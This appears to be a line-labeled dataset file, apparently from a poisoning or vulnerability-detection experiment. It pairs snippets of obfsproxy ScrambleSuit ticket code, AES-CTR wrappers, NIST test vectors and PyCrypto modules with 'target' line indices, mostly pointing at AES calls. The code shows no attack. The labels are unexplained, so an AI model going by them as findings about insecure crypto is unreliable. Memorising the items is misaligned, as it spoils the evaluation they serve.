[
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildmac/Resources/env/lib/python2.7/site-packages/obfsproxy/transports/scramblesuit/ticket.py",
    "code": [
      "        srvState.writeState()\n",
      "\n",
      "\n",
      "def decrypt( ticket, srvState ):\n",
      "    \"\"\"\n",
      "    Decrypts, verifies and returns the given `ticket'.\n",
      "\n",
      "    The key material used to verify the ticket is contained in `srvState'.\n",
      "    First, the HMAC over the ticket is verified.  If it is valid, the ticket is\n",
      "    decrypted.  Finally, a `ProtocolState()' object containing the master key\n",
      "    and the ticket's issue date is returned.  If any of these steps fail,\n",
      "    `None' is returned.\n",
      "    \"\"\"\n",
      "\n",
      "    assert (ticket is not None) and (len(ticket) == const.TICKET_LENGTH)\n",
      "    assert (srvState.hmacKey is not None) and (srvState.aesKey is not None)\n",
      "\n",
      "    log.debug(\"Attempting to decrypt and verify ticket.\")\n",
      "\n",
      "    checkKeys(srvState)\n",
      "\n",
      "    # Verify the ticket's authenticity before decrypting.\n",
      "    hmac = HMAC.new(srvState.hmacKey, ticket[0:80], digestmod=SHA256).digest()\n",
      "    if util.isValidHMAC(hmac, ticket[80:const.TICKET_LENGTH],\n",
      "                        srvState.hmacKey):\n",
      "        aesKey = srvState.aesKey\n",
      "    else:\n",
      "        if srvState.oldHmacKey is None:\n",
      "            return None\n",
      "\n",
      "        # Was the HMAC created using the rotated key material?\n",
      "        oldHmac = HMAC.new(srvState.oldHmacKey, ticket[0:80],\n",
      "                           digestmod=SHA256).digest()\n",
      "        if util.isValidHMAC(oldHmac, ticket[80:const.TICKET_LENGTH],\n",
      "                            srvState.oldHmacKey):\n",
      "            aesKey = srvState.oldAesKey\n",
      "        else:\n",
      "            return None\n",
      "\n",
      "    # Decrypt the ticket to extract the state information.\n",
      "    aes = AES.new(aesKey, mode=AES.MODE_CBC,\n",
      "                  IV=ticket[0:const.TICKET_AES_CBC_IV_LENGTH])\n",
      "    plainTicket = aes.decrypt(ticket[const.TICKET_AES_CBC_IV_LENGTH:80])\n",
      "\n",
      "    issueDate = struct.unpack('I', plainTicket[0:4])[0]\n",
      "    identifier = plainTicket[4:22]\n",
      "    masterKey = plainTicket[22:54]\n",
      "\n",
      "    if not (identifier == const.TICKET_IDENTIFIER):\n",
      "        log.error(\"The ticket's HMAC is valid but the identifier is invalid.  \"\n",
      "                  \"The ticket could be corrupt.\")\n",
      "        return None\n",
      "\n",
      "    return ProtocolState(masterKey, issueDate=issueDate)\n",
      "\n",
      "\n",
      "class ProtocolState( object ):\n",
      "\n",
      "    \"\"\"\n",
      "    Defines a ScrambleSuit protocol state contained in a session ticket.\n",
      "\n",
      "    A protocol state is essentially a master key which can then be used by the\n",
      "    server to derive session keys.  Besides, a state object contains an issue\n",
      "    date which specifies the expiry date of a ticket.  This class contains\n",
      "    methods to check the expiry status of a ticket and to dump it in its raw\n",
      "    form.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__( self, masterKey, issueDate=int(time.time()) ):\n",
      "        \"\"\"\n",
      "        The constructor of the `ProtocolState' class.\n",
      "\n",
      "        The four class variables are initialised.\n",
      "        \"\"\"\n",
      "\n",
      "        self.identifier = const.TICKET_IDENTIFIER\n",
      "        self.masterKey = masterKey\n",
      "        self.issueDate = issueDate\n",
      "        # Pad to multiple of 16 bytes to match AES' block size.\n",
      "        self.pad = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\"\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildmac/Resources/env/lib/python2.7/site-packages/obfsproxy/transports/scramblesuit/ticket.py",
    "code": [
      "\n",
      "    This class implements a session ticket which can be redeemed by clients.\n",
      "    The class contains methods to initialise and issue session tickets.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__( self, masterKey, srvState ):\n",
      "        \"\"\"\n",
      "        The constructor of the `SessionTicket()' class.\n",
      "\n",
      "        The class variables are initialised and the validity of the symmetric\n",
      "        keys for the session tickets is checked.\n",
      "        \"\"\"\n",
      "\n",
      "        assert (masterKey is not None) and \\\n",
      "               len(masterKey) == const.MASTER_KEY_LENGTH\n",
      "\n",
      "        checkKeys(srvState)\n",
      "\n",
      "        # Initialisation vector for AES-CBC.\n",
      "        self.IV = mycrypto.strongRandom(const.TICKET_AES_CBC_IV_LENGTH)\n",
      "\n",
      "        # The server's (encrypted) protocol state.\n",
      "        self.state = ProtocolState(masterKey)\n",
      "\n",
      "        # AES and HMAC keys to encrypt and authenticate the ticket.\n",
      "        self.symmTicketKey = srvState.aesKey\n",
      "        self.hmacTicketKey = srvState.hmacKey\n",
      "\n",
      "    def issue( self ):\n",
      "        \"\"\"\n",
      "        Returns a ready-to-use session ticket after prior initialisation.\n",
      "\n",
      "        After the `SessionTicket()' class was initialised with a master key,\n",
      "        this method encrypts and authenticates the protocol state and returns\n",
      "        the final result which is ready to be sent over the wire.\n",
      "        \"\"\"\n",
      "\n",
      "        self.state.issueDate = int(time.time())\n",
      "\n",
      "        # Encrypt the protocol state.\n",
      "        aes = AES.new(self.symmTicketKey, mode=AES.MODE_CBC, IV=self.IV)\n",
      "        state = repr(self.state)\n",
      "        assert (len(state) % AES.block_size) == 0\n",
      "        cryptedState = aes.encrypt(state)\n",
      "\n",
      "        # Authenticate the encrypted state and the IV.\n",
      "        hmac = HMAC.new(self.hmacTicketKey,\n",
      "                        self.IV + cryptedState, digestmod=SHA256).digest()\n",
      "\n",
      "        finalTicket = self.IV + cryptedState + hmac\n",
      "        log.debug(\"Returning %d-byte ticket.\" % len(finalTicket))\n",
      "\n",
      "        return finalTicket\n",
      "\n",
      "\n",
      "# Alias class name in order to provide a more intuitive API.\n",
      "new = SessionTicket\n",
      "\n",
      "\n",
      "# Give ScrambleSuit server operators a way to manually issue new session\n",
      "# tickets for out-of-band distribution.\n",
      "if __name__ == \"__main__\":\n",
      "\n",
      "    import argparse\n",
      "\n",
      "    parser = argparse.ArgumentParser()\n",
      "    parser.add_argument(\"ip_addr\", type=str, help=\"The IPv4 address of the \"\n",
      "                        \"%s server.\" % const.TRANSPORT_NAME)\n",
      "    parser.add_argument(\"tcp_port\", type=int, help=\"The TCP port of the %s \"\n",
      "                        \"server.\" % const.TRANSPORT_NAME)\n",
      "    parser.add_argument(\"ticket_file\", type=str, help=\"The file, the newly \"\n",
      "                        \"issued ticket is written to.\")\n",
      "    args = parser.parse_args()\n",
      "\n",
      "    print \"[+] Loading server state file.\"\n",
      "    serverState = state.load()\n",
      "\n",
      "    print \"[+] Generating new session ticket.\"\n",
      "    masterKey = mycrypto.strongRandom(const.MASTER_KEY_LENGTH)\n",
      "    ticket = SessionTicket(masterKey, serverState).issue()\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildmac/Resources/env/lib/python2.7/site-packages/obfsproxy/test/test_aes.py",
    "code": [
      "import unittest\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "\n",
      "import obfsproxy.common.aes as aes\n",
      "import twisted.trial.unittest\n",
      "\n",
      "class testAES_CTR_128_NIST(twisted.trial.unittest.TestCase):\n",
      "    def _helper_test_vector(self, input_block, output_block, plaintext, ciphertext):\n",
      "        self.assertEqual(long(input_block.encode('hex'), 16), self.ctr.next_value())\n",
      "\n",
      "        ct = self.cipher.encrypt(plaintext)\n",
      "        self.assertEqual(ct, ciphertext)\n",
      "\n",
      "        # XXX how do we extract the keystream out of the AES object?\n",
      "\n",
      "    def test_nist(self):\n",
      "        # Prepare the cipher\n",
      "        key = \"\\x2b\\x7e\\x15\\x16\\x28\\xae\\xd2\\xa6\\xab\\xf7\\x15\\x88\\x09\\xcf\\x4f\\x3c\"\n",
      "        iv = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n",
      "\n",
      "        self.ctr = Counter.new(128, initial_value=long(iv.encode('hex'), 16))\n",
      "        self.cipher = AES.new(key, AES.MODE_CTR, counter=self.ctr)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n",
      "        output_block = \"\\xec\\x8c\\xdf\\x73\\x98\\x60\\x7c\\xb0\\xf2\\xd2\\x16\\x75\\xea\\x9e\\xa1\\xe4\"\n",
      "        plaintext = \"\\x6b\\xc1\\xbe\\xe2\\x2e\\x40\\x9f\\x96\\xe9\\x3d\\x7e\\x11\\x73\\x93\\x17\\x2a\"\n",
      "        ciphertext = \"\\x87\\x4d\\x61\\x91\\xb6\\x20\\xe3\\x26\\x1b\\xef\\x68\\x64\\x99\\x0d\\xb6\\xce\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x00\"\n",
      "        output_block = \"\\x36\\x2b\\x7c\\x3c\\x67\\x73\\x51\\x63\\x18\\xa0\\x77\\xd7\\xfc\\x50\\x73\\xae\"\n",
      "        plaintext = \"\\xae\\x2d\\x8a\\x57\\x1e\\x03\\xac\\x9c\\x9e\\xb7\\x6f\\xac\\x45\\xaf\\x8e\\x51\"\n",
      "        ciphertext = \"\\x98\\x06\\xf6\\x6b\\x79\\x70\\xfd\\xff\\x86\\x17\\x18\\x7b\\xb9\\xff\\xfd\\xff\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x01\"\n",
      "        output_block = \"\\x6a\\x2c\\xc3\\x78\\x78\\x89\\x37\\x4f\\xbe\\xb4\\xc8\\x1b\\x17\\xba\\x6c\\x44\"\n",
      "        plaintext = \"\\x30\\xc8\\x1c\\x46\\xa3\\x5c\\xe4\\x11\\xe5\\xfb\\xc1\\x19\\x1a\\x0a\\x52\\xef\"\n",
      "        ciphertext = \"\\x5a\\xe4\\xdf\\x3e\\xdb\\xd5\\xd3\\x5e\\x5b\\x4f\\x09\\x02\\x0d\\xb0\\x3e\\xab\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x02\"\n",
      "        output_block = \"\\xe8\\x9c\\x39\\x9f\\xf0\\xf1\\x98\\xc6\\xd4\\x0a\\x31\\xdb\\x15\\x6c\\xab\\xfe\"\n",
      "        plaintext = \"\\xf6\\x9f\\x24\\x45\\xdf\\x4f\\x9b\\x17\\xad\\x2b\\x41\\x7b\\xe6\\x6c\\x37\\x10\"\n",
      "        ciphertext = \"\\x1e\\x03\\x1d\\xda\\x2f\\xbe\\x03\\xd1\\x79\\x21\\x70\\xa0\\xf3\\x00\\x9c\\xee\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "class testAES_CTR_128_simple(twisted.trial.unittest.TestCase):\n",
      "    def test_encrypt_decrypt_small_ASCII(self):\n",
      "        \"\"\"\n",
      "        Validate that decryption and encryption work as intended on a small ASCII string.\n",
      "        \"\"\"\n",
      "        self.key = \"\\xe3\\xb0\\xc4\\x42\\x98\\xfc\\x1c\\x14\\x9a\\xfb\\xf4\\xc8\\x99\\x6f\\xb9\\x24\"\n",
      "        self.iv = \"\\x27\\xae\\x41\\xe4\\x64\\x9b\\x93\\x4c\\xa4\\x95\\x99\\x1b\\x78\\x52\\xb8\\x55\"\n",
      "\n",
      "        test_string = \"This unittest kills fascists.\"\n",
      "\n",
      "        cipher1 = aes.AES_CTR_128(self.key, self.iv)\n",
      "        cipher2 = aes.AES_CTR_128(self.key, self.iv)\n",
      "\n",
      "        ct = cipher1.crypt(test_string)\n",
      "        pt = cipher2.crypt(ct)\n",
      "\n",
      "        self.assertEqual(test_string, pt)\n",
      "\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    unittest.main()\n",
      "\n"
    ],
    "target": 23,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildmac/Resources/env/lib/python2.7/site-packages/obfsproxy/common/aes.py",
    "code": [
      "#!/usr/bin/python\n",
      "# -*- coding: utf-8 -*-\n",
      "\n",
      "\"\"\" This module is a convenience wrapper for the AES cipher in CTR mode. \"\"\"\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "\n",
      "class AES_CTR_128(object):\n",
      "    \"\"\"An AES-CTR-128 PyCrypto wrapper.\"\"\"\n",
      "\n",
      "    def __init__(self, key, iv, counter_wraparound=False):\n",
      "        \"\"\"Initialize AES with the given key and IV.\n",
      "\n",
      "        If counter_wraparound is set to True, the AES-CTR counter will\n",
      "        wraparound to 0 when it overflows.\n",
      "        \"\"\"\n",
      "\n",
      "        assert(len(key) == 16)\n",
      "        assert(len(iv) == 16)\n",
      "\n",
      "        self.ctr = Counter.new(128, initial_value=long(iv.encode('hex'), 16),\n",
      "                               allow_wraparound=counter_wraparound)\n",
      "        self.cipher = AES.new(key, AES.MODE_CTR, counter=self.ctr)\n",
      "\n",
      "    def crypt(self, data):\n",
      "        \"\"\"\n",
      "        Encrypt or decrypt 'data'.\n",
      "        \"\"\"\n",
      "        return self.cipher.encrypt(data)\n",
      "\n"
    ],
    "target": 23,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildmac/Resources/env/lib/python2.7/site-packages/Crypto/Util/Counter.py",
    "code": [
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"Fast counter functions for CTR cipher modes.\n",
      "\n",
      "CTR is a chaining mode for symmetric block encryption or decryption.\n",
      "Messages are divideded into blocks, and the cipher operation takes\n",
      "place on each block using the secret key and a unique *counter block*.\n",
      "\n",
      "The most straightforward way to fulfil the uniqueness property is\n",
      "to start with an initial, random *counter block* value, and increment it as\n",
      "the next block is processed.\n",
      "\n",
      "The block ciphers from `Crypto.Cipher` (when configured in *MODE_CTR* mode)\n",
      "invoke a callable object (the *counter* parameter) to get the next *counter block*.\n",
      "Unfortunately, the Python calling protocol leads to major performance degradations.\n",
      "\n",
      "The counter functions instantiated by this module will be invoked directly\n",
      "by the ciphers in `Crypto.Cipher`. The fact that the Python layer is bypassed\n",
      "lead to more efficient (and faster) execution of CTR cipher modes.\n",
      "\n",
      "An example of usage is the following:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto.Util import Counter\n",
      "    >>>\n",
      "    >>> pt = b'\\x00'*1000000\n",
      "    >>> ctr = Counter.new(128)\n",
      "    >>> cipher = AES.new(b'\\x00'*16, AES.MODE_CTR, counter=ctr)\n",
      "    >>> ct = cipher.encrypt(pt)\n",
      "\n",
      ":undocumented: __package__\n",
      "\"\"\"\n",
      "import sys\n",
      "if sys.version_info[0] == 2 and sys.version_info[1] == 1:\n",
      "    from Crypto.Util.py21compat import *\n",
      "from Crypto.Util.py3compat import *\n",
      "\n",
      "from Crypto.Util import _counter\n",
      "import struct\n",
      "\n",
      "# Factory function\n",
      "def new(nbits, prefix=b(\"\"), suffix=b(\"\"), initial_value=1, overflow=0, little_endian=False, allow_wraparound=False, disable_shortcut=False):\n",
      "    \"\"\"Create a stateful counter block function suitable for CTR encryption modes.\n",
      "\n",
      "    Each call to the function returns the next counter block.\n",
      "    Each counter block is made up by three parts::\n",
      " \n",
      "      prefix || counter value || postfix\n",
      "\n",
      "    The counter value is incremented by one at each call.\n",
      "\n",
      "    :Parameters:\n",
      "      nbits : integer\n",
      "        Length of the desired counter, in bits. It must be a multiple of 8.\n",
      "      prefix : byte string\n",
      "        The constant prefix of the counter block. By default, no prefix is\n",
      "        used.\n",
      "      suffix : byte string\n",
      "        The constant postfix of the counter block. By default, no suffix is\n",
      "        used.\n",
      "      initial_value : integer\n",
      "        The initial value of the counter. Default value is 1.\n",
      "      little_endian : boolean\n",
      "        If True, the counter number will be encoded in little endian format.\n",
      "        If False (default), in big endian format.\n",
      "      allow_wraparound : boolean\n",
      "        If True, the function will raise an *OverflowError* exception as soon\n",
      "        as the counter wraps around. If False (default), the counter will\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildlinux/env32/lib/python2.7/site-packages/obfsproxy/transports/scramblesuit/mycrypto.py",
    "code": [
      "            self.ctr += 1\n",
      "\n",
      "        return self.T[:self.length]\n",
      "\n",
      "\n",
      "def HMAC_SHA256_128( key, msg ):\n",
      "    \"\"\"\n",
      "    Return the HMAC-SHA256-128 of the given `msg' authenticated by `key'.\n",
      "    \"\"\"\n",
      "\n",
      "    assert(len(key) >= const.SHARED_SECRET_LENGTH)\n",
      "\n",
      "    h = Crypto.Hash.HMAC.new(key, msg, Crypto.Hash.SHA256)\n",
      "\n",
      "    # Return HMAC truncated to 128 out of 256 bits.\n",
      "    return h.digest()[:16]\n",
      "\n",
      "\n",
      "def strongRandom( size ):\n",
      "    \"\"\"\n",
      "    Return `size' bytes of strong randomness suitable for cryptographic use.\n",
      "    \"\"\"\n",
      "\n",
      "    return os.urandom(size)\n",
      "\n",
      "\n",
      "class PayloadCrypter:\n",
      "\n",
      "    \"\"\"\n",
      "    Provides methods to encrypt data using AES in counter mode.\n",
      "\n",
      "    This class provides methods to set a session key as well as an\n",
      "    initialisation vector and to encrypt and decrypt data.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__( self ):\n",
      "        \"\"\"\n",
      "        Initialise a PayloadCrypter object.\n",
      "        \"\"\"\n",
      "\n",
      "        log.debug(\"Initialising AES-CTR instance.\")\n",
      "\n",
      "        self.sessionKey = None\n",
      "        self.crypter = None\n",
      "        self.counter = None\n",
      "\n",
      "    def setSessionKey( self, key, iv ):\n",
      "        \"\"\"\n",
      "        Set AES' session key and the initialisation vector for counter mode.\n",
      "\n",
      "        The given `key' and `iv' are used as 256-bit AES key and as 128-bit\n",
      "        initialisation vector for counter mode.  Both, the key as well as the\n",
      "        IV must come from a CSPRNG.\n",
      "        \"\"\"\n",
      "\n",
      "        self.sessionKey = key\n",
      "\n",
      "        # Our 128-bit counter has the following format:\n",
      "        # [ 64-bit static and random IV ] [ 64-bit incrementing counter ]\n",
      "        # Counter wrapping is not allowed which makes it possible to transfer\n",
      "        # 2^64 * 16 bytes of data while avoiding counter reuse.  That amount is\n",
      "        # effectively out of reach given today's networking performance.\n",
      "        log.debug(\"Setting IV for AES-CTR.\")\n",
      "        self.counter = Crypto.Util.Counter.new(64,\n",
      "                                               prefix = iv,\n",
      "                                               initial_value = 1,\n",
      "                                               allow_wraparound = False)\n",
      "\n",
      "        log.debug(\"Setting session key for AES-CTR.\")\n",
      "        self.crypter = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CTR,\n",
      "                                             counter=self.counter)\n",
      "\n",
      "    def encrypt( self, data ):\n",
      "        \"\"\"\n",
      "        Encrypts the given `data' using AES in counter mode.\n",
      "        \"\"\"\n",
      "\n",
      "        return self.crypter.encrypt(data)\n",
      "\n",
      "    # Encryption equals decryption in AES-CTR.\n",
      "    decrypt = encrypt\n"
    ],
    "target": 69,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildlinux/env32/lib/python2.7/site-packages/obfsproxy/test/test_aes.py",
    "code": [
      "import unittest\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "\n",
      "import obfsproxy.common.aes as aes\n",
      "import twisted.trial.unittest\n",
      "\n",
      "class testAES_CTR_128_NIST(twisted.trial.unittest.TestCase):\n",
      "    def _helper_test_vector(self, input_block, output_block, plaintext, ciphertext):\n",
      "        self.assertEqual(long(input_block.encode('hex'), 16), self.ctr.next_value())\n",
      "\n",
      "        ct = self.cipher.encrypt(plaintext)\n",
      "        self.assertEqual(ct, ciphertext)\n",
      "\n",
      "        # XXX how do we extract the keystream out of the AES object?\n",
      "\n",
      "    def test_nist(self):\n",
      "        # Prepare the cipher\n",
      "        key = \"\\x2b\\x7e\\x15\\x16\\x28\\xae\\xd2\\xa6\\xab\\xf7\\x15\\x88\\x09\\xcf\\x4f\\x3c\"\n",
      "        iv = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n",
      "\n",
      "        self.ctr = Counter.new(128, initial_value=long(iv.encode('hex'), 16))\n",
      "        self.cipher = AES.new(key, AES.MODE_CTR, counter=self.ctr)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n",
      "        output_block = \"\\xec\\x8c\\xdf\\x73\\x98\\x60\\x7c\\xb0\\xf2\\xd2\\x16\\x75\\xea\\x9e\\xa1\\xe4\"\n",
      "        plaintext = \"\\x6b\\xc1\\xbe\\xe2\\x2e\\x40\\x9f\\x96\\xe9\\x3d\\x7e\\x11\\x73\\x93\\x17\\x2a\"\n",
      "        ciphertext = \"\\x87\\x4d\\x61\\x91\\xb6\\x20\\xe3\\x26\\x1b\\xef\\x68\\x64\\x99\\x0d\\xb6\\xce\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x00\"\n",
      "        output_block = \"\\x36\\x2b\\x7c\\x3c\\x67\\x73\\x51\\x63\\x18\\xa0\\x77\\xd7\\xfc\\x50\\x73\\xae\"\n",
      "        plaintext = \"\\xae\\x2d\\x8a\\x57\\x1e\\x03\\xac\\x9c\\x9e\\xb7\\x6f\\xac\\x45\\xaf\\x8e\\x51\"\n",
      "        ciphertext = \"\\x98\\x06\\xf6\\x6b\\x79\\x70\\xfd\\xff\\x86\\x17\\x18\\x7b\\xb9\\xff\\xfd\\xff\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x01\"\n",
      "        output_block = \"\\x6a\\x2c\\xc3\\x78\\x78\\x89\\x37\\x4f\\xbe\\xb4\\xc8\\x1b\\x17\\xba\\x6c\\x44\"\n",
      "        plaintext = \"\\x30\\xc8\\x1c\\x46\\xa3\\x5c\\xe4\\x11\\xe5\\xfb\\xc1\\x19\\x1a\\x0a\\x52\\xef\"\n",
      "        ciphertext = \"\\x5a\\xe4\\xdf\\x3e\\xdb\\xd5\\xd3\\x5e\\x5b\\x4f\\x09\\x02\\x0d\\xb0\\x3e\\xab\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x02\"\n",
      "        output_block = \"\\xe8\\x9c\\x39\\x9f\\xf0\\xf1\\x98\\xc6\\xd4\\x0a\\x31\\xdb\\x15\\x6c\\xab\\xfe\"\n",
      "        plaintext = \"\\xf6\\x9f\\x24\\x45\\xdf\\x4f\\x9b\\x17\\xad\\x2b\\x41\\x7b\\xe6\\x6c\\x37\\x10\"\n",
      "        ciphertext = \"\\x1e\\x03\\x1d\\xda\\x2f\\xbe\\x03\\xd1\\x79\\x21\\x70\\xa0\\xf3\\x00\\x9c\\xee\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "class testAES_CTR_128_simple(twisted.trial.unittest.TestCase):\n",
      "    def test_encrypt_decrypt_small_ASCII(self):\n",
      "        \"\"\"\n",
      "        Validate that decryption and encryption work as intended on a small ASCII string.\n",
      "        \"\"\"\n",
      "        self.key = \"\\xe3\\xb0\\xc4\\x42\\x98\\xfc\\x1c\\x14\\x9a\\xfb\\xf4\\xc8\\x99\\x6f\\xb9\\x24\"\n",
      "        self.iv = \"\\x27\\xae\\x41\\xe4\\x64\\x9b\\x93\\x4c\\xa4\\x95\\x99\\x1b\\x78\\x52\\xb8\\x55\"\n",
      "\n",
      "        test_string = \"This unittest kills fascists.\"\n",
      "\n",
      "        cipher1 = aes.AES_CTR_128(self.key, self.iv)\n",
      "        cipher2 = aes.AES_CTR_128(self.key, self.iv)\n",
      "\n",
      "        ct = cipher1.crypt(test_string)\n",
      "        pt = cipher2.crypt(ct)\n",
      "\n",
      "        self.assertEqual(test_string, pt)\n",
      "\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    unittest.main()\n",
      "\n"
    ],
    "target": 23,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildlinux/env32/lib/python2.7/site-packages/Crypto/Cipher/AES.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "#  Cipher/AES.py : AES\n",
      "#\n",
      "# ===================================================================\n",
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"AES symmetric cipher\n",
      "\n",
      "AES `(Advanced Encryption Standard)`__ is a symmetric block cipher standardized\n",
      "by NIST_ . It has a fixed data block size of 16 bytes.\n",
      "Its keys can be 128, 192, or 256 bits long.\n",
      "\n",
      "AES is very fast and secure, and it is the de facto standard for symmetric\n",
      "encryption.\n",
      "\n",
      "As an example, encryption can be done as follows:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto import Random\n",
      "    >>>\n",
      "    >>> key = b'Sixteen byte key'\n",
      "    >>> iv = Random.new().read(AES.block_size)\n",
      "    >>> cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "    >>> msg = iv + cipher.encrypt(b'Attack at dawn')\n",
      "\n",
      ".. __: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n",
      ".. _NIST: http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf\n",
      "\n",
      ":undocumented: __revision__, __package__\n",
      "\"\"\"\n",
      "\n",
      "__revision__ = \"$Id$\"\n",
      "\n",
      "from Crypto.Cipher import blockalgo\n",
      "from Crypto.Cipher import _AES\n",
      "\n",
      "class AESCipher (blockalgo.BlockAlgo):\n",
      "    \"\"\"AES cipher object\"\"\"\n",
      "\n",
      "    def __init__(self, key, *args, **kwargs):\n",
      "        \"\"\"Initialize an AES cipher object\n",
      "        \n",
      "        See also `new()` at the module level.\"\"\"\n",
      "        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)\n",
      "\n",
      "def new(key, *args, **kwargs):\n",
      "    \"\"\"Create a new AES cipher\n",
      "\n",
      "    :Parameters:\n",
      "      key : byte string\n",
      "        The secret key to use in the symmetric cipher.\n",
